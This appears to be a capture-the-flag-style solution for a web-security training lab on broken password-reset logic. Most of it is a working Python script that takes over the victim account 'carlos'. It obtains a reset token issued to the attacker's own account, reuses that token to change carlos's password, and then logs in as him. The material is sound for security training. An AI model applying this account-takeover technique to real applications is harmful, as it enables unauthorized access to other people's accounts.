# Password reset broken logic

> This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
- Your credentials: `wiener:peter`
- Victim's username: `carlos`

```python
import requests
import sys
from bs4 import BeautifulSoup
import re

BASE_URL = "https://0a9800240389752a809f4eb0003c0072.web-security-academy.net/"
EMAIL_CLIENT_URL = "https://exploit-0af900b8030d75d780294d66013b00ca.exploit-server.net/email"

def exploit(url,emailclient):
    session = requests.Session()
    forget_pw_endpoint = url + "forgot-password"
    info = {"username":"wiener"}
    response = session.post(forget_pw_endpoint,data=info)
    response = session.get(emailclient)
    soup = BeautifulSoup(response.text,'html.parser')
    pattern = r"temp-forgot-password-token=([a-zA-Z0-9]+)"
    token = re.search(pattern, response.text).group(1)
    new_pw_endpoint = url + f"forgot-password"
    pwtoken = {"temp-forgot-password-token":token}
    data = {
        "temp-forgot-password-token":token,
        "username":"carlos",
        "new-password-1":"sithum",
        "new-password-2":"sithum"
    }
    response = session.post(new_pw_endpoint,data=data,params=pwtoken)
    if response.status_code == 302 or response.status_code == 200:
        print("PASSWORD UPDATED SUCCESSFULLY")
        
        
        login_endpoint = url + "login"
        newlogcreds = {
            "username":"carlos",
            "password":"sithum"
        }
        response = session.post(login_endpoint,data=newlogcreds)
        if "Log out" in response.text:
            print("LOGIN AS CARLOS SUCCESSFULL")
            info = {"id":"carlos"}
            myacc_endpoint = url + "my-account"
            response = session.get(myacc_endpoint,params=info)
            response = session.get(url)
            if "Congratulations" in response.text:
                print("SUCCESSFULLY COMPLETED THE LAB")
        
    
    
    
    
if __name__ == "__main__":
    exploit(BASE_URL,EMAIL_CLIENT_URL)
```